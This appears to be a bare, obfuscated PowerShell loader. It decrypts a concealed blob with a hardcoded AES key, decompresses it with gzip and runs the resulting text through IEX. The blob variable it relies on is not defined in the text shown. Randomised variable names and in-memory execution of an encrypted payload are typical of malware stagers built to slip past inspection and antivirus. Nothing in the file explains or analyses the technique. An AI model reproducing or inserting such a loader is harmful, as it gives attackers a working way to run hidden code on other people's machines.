$ubepza = New-Object "System.Security.Cryptography.AesManaged"
$dxma = [System.Convert]::FromBase64String("ZbCgCNAGngVFuMLjERbQG9RL03g//9Rk+XNyfx25bLc=")
$ubepza.Mode = [System.Security.Cryptography.CipherMode]::CBC
$ubepza.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$ubepza.BlockSize = 128
$ubepza.KeySize = 128
$ubepza.Key = $dxma
$ubepza.IV = $ghvwsv[0..15]
$sjzvw = New-Object System.IO.MemoryStream(,$ubepza.CreateDecryptor().TransformFinalBlock($ghvwsv,16,$ghvwsv.Length-16))
$mfon = New-Object System.IO.MemoryStream
$ocmhqdyn = New-Object System.IO.Compression.GzipStream $sjzvw, ([IO.Compression.CompressionMode]::Decompress)
$ocmhqdyn.CopyTo($mfon)
$eojgasj = [System.Text.Encoding]::UTF8.GetString($mfon.ToArray())
$ubepza.Dispose()
$sjzvw.Close()
$ocmhqdyn.Close()
IEX($eojgasj)